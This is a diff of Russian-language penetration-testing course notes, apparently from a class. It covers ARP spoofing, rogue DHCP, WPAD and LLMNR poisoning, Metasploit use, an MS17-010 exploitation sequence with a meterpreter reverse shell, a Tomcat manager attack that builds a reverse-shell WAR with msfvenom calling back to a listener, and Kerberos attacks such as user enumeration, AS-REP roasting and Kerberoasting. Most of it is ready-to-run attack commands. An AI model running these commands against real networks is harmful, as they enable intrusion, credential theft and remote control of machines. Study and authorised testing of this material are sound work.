@@ -37,12 +37,14 @@ sudo yersinia -G (или -I в консольном режиме)
 	Port Security
 
 
+
 ARP (50%)
 ARP spoofing
 	mitmf (фреймворк уже не поддерживаеся, но пока жив арп, н будет актуален)
 	ettercap -T 10.10.10.10 -X --httpd --proxy-https --proxy
 	arpspoof -i eth0 -t 10.10.10.10
 	Intercepter-NG
+
 
 	
 DTP (Dynamic Trunking Protocol) (5%)
@@ -51,8 +53,10 @@ DTP (Dynamic Trunking Protocol) (5%)
 	dtp.spoof.py
 
 
+
 VTP (Обмен нформации о существовающих VLAN) (5%)
 	
+
 
 Rogue DHCP (90%)
 (Full Slaak Attack) Очень мощная атака
@@ -62,18 +66,22 @@ Rogue DHCP (90%)
 	mitm6 -i eth0  	(упрощенная версия, которая не кладе сеть)
 
 
+
 HSRP (8%)
 	сморим, не передается ли autheticatio data в чистом виде
 	yersinia
 	scapy
 
 
+
 RIPv2 (2%)
 	если видим RIP - сразу пишем об эом как об уязвимостии
 
 
+
 OSPF (1%)
 	нет инструментов для атак
+
 
 
 EIGRP
@@ -82,8 +90,10 @@ EIGRP
 	t50	
 
 
+
 ICMP 
 	ICMP  Redirect
+
 
 
 NBT-NS/LLMNR  poisoning 
@@ -93,12 +103,15 @@ NBT-NS/LLMNR  poisoning
 	Request DNS
 	NBT-DNS
 
+
+
 WPAD (98%)
 По дефолту включен в винде, позволяет подсунуь нашг прокси и гнать весь трафик через него
 	Responder
 	Mitm6
 	Inveigh
 	msf (auxiliary/spoof/ndns/nbns_response) (auxiliary/spoof/llmnr/llmnr_response)
+
 
 
 CDP (Cisco Discovery Protocol)
@@ -121,11 +134,22 @@ Encoders (в теории скрывают вредоносное по от ан
 
 
 Auxiliary
+Сбор информации
 
 
 
 Exploits
-use exploit/multi/handler - хендлер
+use exploit/multi/handler
+
+Используяются в сочетании с payload
+
+
+
+Payloads
+Bind vs Reverse
+	Meterpreter
+	Shell
+	Command exec
 
 
 
@@ -145,7 +169,7 @@ Author
 Disclosure date
 Platform/Arch
 License
-Target (если эксплоит не работает, )
+Target (если эксплоит не работает, возможно таргет выбран не верно)
 
 
 
@@ -155,9 +179,11 @@ $ sudo msfdb init
 $ msfconsole
 msf6> db_status		Проверить статус базы данных
 
+msf6> db_connect -y /usr/share/metasploit-framework/config/database.yml
 
 
-Поск 
+
+Search 
 msf6> search name:mysql
 msf6> search platform:aix
 msf6> search type:post
@@ -195,7 +221,8 @@ msf6> sessions -C		Выполнениие команды метерпретер�
 msf6> sessions -K		Убить все сессии
 
 Jobs
-msf6> 
+msf6> jobs -l			Список запущенных хендлеров и серверов
+msf6> jobs -K			Убить все задачи
 
 
 
@@ -230,12 +257,18 @@ $ nmap -Pn (десктопная внда не отвечает при вклю�
 
 
 
-Типовые вектора
+Типовые вектора "пробива"
+MS17-010 
+MSSQL
+PostgreSQL
+Tomcat
+
+
 
 MS17-010 (60%)
 smb_ms17_010
-ms17_010_eternalblue (
-ms17_010_psexec (если pipe доступен, то лучше спользовать во всех случаях)
+ms17_010_eternalblue (иногда может уронить машину)
+ms17_010_psexec (если pipe доступен, то лучше использовать во всех случаях)
 ms17_010_eternalblue_win8
 
 
@@ -244,24 +277,40 @@ msf6> cd <folder with scan> 				Переходим в папку со скано
 msf6> db_import scan					Подгружаем файл сканирования в базу данных msf
 msf6> services						Вывод информации из базы данных
 msf6> services -p 445					Выводм только с портами 445
-msf6> use auxiliary/scaner/smb/smb_version		
+
+msf6> use auxiliary/scaner/smb/smb_version		Модуль собирает некоторую инфомрацию о SMB
 msf6> options						
 msf6> services -p 445 -R				Устанавливаем дапазон машиин как RHOST
 msf6> set threads 50					
-msf6> set verbose false					
-msf6> run						
+msf6> set verbose false					Отключаем лишний вывод информации
+msf6> run						Запускаем
+
 msf6> services -p 445					Теперь имеем всю информацию
-msf6> use auxiliary/scaner/smb/smb_ms17_010
+msf6> use auxiliary/scaner/smb/smb_ms17_010		Сканируем на 
 msf6> set threads 100
-msf6> 
+msf6> set verbose false
+msf6> set check_pipe true				Заодно ищем открытые пайпы		
+
+msf6> vulns 						Показывает все найденные уязвимости
+
+msf6> use windows/smb/ms17_010_psexec			Если нашли пайп, то используем psexec
+msf6> set rhost <ip>
+msf6> set payload windows/x64/meterpreter/reverse_tcp	Для ms17_010 нужно выбрать 64-битную версию
+msf6> set lhsot <tun0>					Вместо адреса можно указать интерфейс
+msf6> run
+
 
 
 хинт к дз (238)
 
-
-
-
-
+Tomcat
+msf6> use auxiliary/scanner/http/tomcat_mgr_login
+<ip>:8080/manager
+$ msfvenom -p java/meterpreter/reverse_tcp LHOST=198.18.245.5 LPORT=4444 -f war -o tomcatshell.war
+msf6> use exploit/multi/handler
+msf6> set lhost tun0
+msf6> set payload java/meterpreter/reverse_tcp
+msf6> run
 
 
 
@@ -316,3 +365,57 @@ meterpreter> impersonate_token "NT_AUTHORITY\\SYSTEM"
 Bash
 Ctrl + R	Найти ии выполнить команду из истории
 zcat 		cat файл из архива
+
+
+
+
+
+Занятие 4
+
+
+
+
+
+Занятие 5
+
+Kerberos 
+Протокол для аутентификации пользователей при входе в систему
+Часто встречается в Windows AD
+
+AS - authentification server 
+TGS - ticket-granting server
+
+В Kerberos синхронизация времени крайне важна
+
+Port 88 (kerberos) - признак контроллера домена
+
+
+
+Атаки
+
+Kerberos Brute
+узнав корпоративный шаблон учетных записей (I.Ivanov, Ivanov.I.S...)
+можно создать словарь по шаблону и после этого побрутить
+msf6> use auxiliary/gather/kreberos_enumusers
+msf6> set rhosts <>
+msf6> set USER_FILE <user.txt>
+msf6> set DOMAIN <ignite.local>
+msf6> exploit
+Узнав существующие учетки бруатем их по словарям
+
+
+
+AS Rep Roasting/impacket
+Если отключена Kerberos preauthentication у пользователя, можно получить его tgs, который можно брутить
+$ getmpusers.py
+
+
+
+Kerberoasting/impacket (90%)
+GetUserSPNs.py -request -dc -ip 10.10.10.100 active.htb/svs tgs
+
+
+
+$ carckmapexec smb 192.168.1.0/24		Сканируем адреса на smb порт
+
+
